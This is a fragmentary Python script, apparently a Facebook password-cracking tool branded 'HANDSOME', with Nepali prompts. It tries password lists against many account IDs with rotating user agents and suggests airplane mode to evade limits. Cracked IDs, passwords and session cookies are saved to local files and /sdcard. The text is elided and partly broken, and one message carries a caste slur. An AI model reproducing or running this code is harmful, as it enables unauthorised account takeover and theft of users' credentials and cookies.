...
#------------------[ LOGO-LAKNAT ]-----------------#
logo = ("""\033[1;32m]""") 	
    ___ ___    _____    _______  ______________.___.
 /   |   \  /  _  \   \      \ \_   ___ \__  |   |
/    ~    \/  /_\  \  /   |   \/    \  \//   |   |
\    Y    /    |    \/    |    \     \___\____   |
 \___|_  /\____|__  /\____|__  /\______  / ______|
       \/         \/         \/        \/\/       
   ____  ___                                      
   \   \/  /                                      
    \     /                                       
 ...
 \_____  \  /  /_\  \  /  \ /  \|   ||       _/   
 /        \/    |    \/    Y    \   ||    |   \   
/_______  /\____|__  /\____|__  /___||____|_  /   
def info():         

• DEVLOPER : \033[1;37mHANDSOME-\033[1;32m\033[1;37m
		...
		with requests.Session() as rsn:
			try:
				...
				if '"access_token":' in str(response.headers):
					...
					print('[\033[1;31mx\033[1;37m] AADITYA DALIT JASTO BANI NA DEKHA%(p))

			except:
				linex()
				print('\033[1;37m[\033[1;31m×\033[1;37m] AADITYA DALIT JASTO BANI NA DEKHA')
...
def passwrd():
    ...
    linex()
    print("\033[1;37m AIRPLANE MODE USE HANNE GAR DHERAI ID AAUXA\033[1;32m")
    linex()
...
'bi_xrwh': 0
    ...
    'viewport-width': '980',
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print(f'\r{P}{H} [HANDSOME-OK] {H}{idf}|{pw}\n{P}[{H}COOKIE]{P}\033[1;31m{kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				open('/sdcard/HANDSOME-OK.txt', 'a').write( idf+' | '+pw+' | '+kuki+'\n')
				jones(idf,pw,kuki)
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}[{K} HANDSOME-CP{P}] {K}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				open('/sdcard/HANDSOME-CP.txt', 'a').write( idf+' | '+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r \u001b[37m[HANDSOME] {loop}/{len(id)} OK[{H}{ok}\u001b[37m] [{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}{K} [{time.strftime("HANDSOME")}-CP] {idf} │ {pw} {P}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
